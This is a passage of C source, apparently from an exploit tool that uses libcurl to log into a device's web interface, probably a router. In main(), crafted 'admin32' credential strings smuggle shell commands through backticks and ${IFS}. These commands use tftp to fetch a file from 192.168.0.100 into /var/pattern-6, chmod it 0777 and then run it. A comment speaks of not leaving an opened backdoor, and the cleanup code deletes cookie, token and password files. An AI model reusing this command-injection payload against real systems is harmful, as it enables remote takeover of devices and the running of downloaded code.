			fprintf(stderr, "[%s] %s Operation '%s' done with status=%d\n\n\n", __FILE__, __func__ , aTestTable[iOpIdx].cName, iRes);
#if (1)
			/* Optional. Exit the site; let's not leave an opened backdoor after us. */
			iRes = iProcessArray(urlLib, (void *) aExitArray);
#endif /* (1) */

			/* Self-explanatory */
			printf("[%s] %s Site closed[%d]. No opetaion is allowed unless it's opened again next time\n", __FILE__, __func__ , iRepetitions); 
		}

		/* Clean after ourselves */
		curl_easy_cleanup(urlLib);

	} /* if(urlLib) */

#if (EXTRA_PURITY)
	unlink (ENCR_FNAME);

	unlink (CKY_FNAME);

	unlink (TOKEN_FNAME);

	unlink (PASSWD_FNAME);
#endif /* (EXTRA_PURITY) */

	/* TODO: who will catch this return code. if noone then what's the point? */
	return iRes;

} /* int _main (int argc, char **argv) */


/* New main() */
int main(int argc, char **argv)
{
/* Return code */
int iRet; 

	sprintf (str1, "admin32%cadmin32%c<`tftp${IFS}-g${IFS}192.168.0.100${IFS}-r${IFS}apptest${IFS}-l/var/pattern-6`", 0x27, 0x27);
	sprintf (str2, "admin32");

	sprintf (str3, "admin32%cadmin32%c<`chmod${IFS}0777$IFS/var/pattern-6`", 0x27, 0x27);
	sprintf (str4, "admin30");

	sprintf (str5, "admin32%cadmin32%c<`/var/pattern-6`", 0x27, 0x27);
	sprintf (str6, "admin32");

	sprintf (str7, "anytext");
	sprintf (str8, "anytext");



	/* Throughout _all operation arrays */
	for (iOpIdx = 0; iOpIdx < ARRAY_SIZE(aTestTable); iOpIdx++)
	{
		/* Check is array with operations is not empty */
		if (NULL != (void *)(aTestTable[iOpIdx].apArr) )

			/* Self-explanatory */
			fprintf(stderr, "[%s] %s Checking operation '%s'\n", __FILE__, __func__ , aTestTable[iOpIdx].cName); 
		else
		{
			/* Self-explanatory */
			fprintf(stderr, "[%s] %s Empty operation '%s'. ERROR.\n", __FILE__, __func__ , aTestTable[iOpIdx].cName); 

			/* Mark the ailing step, in case anybody outside will require the execurion status */
			iRet = R30_EMPTY_OP;

			/* Don't  check this operation, try next one */
			continue;
		}

		/* Actually is strictly needed, but let's keep it till nearest speed optimization */
		sleep (R30_GP_TMO);
		
		/* Run the systainability checker */
		iRet = _main(argc, argv);
	}

	return iRet;

} /* int main (int argc, char **argv) */
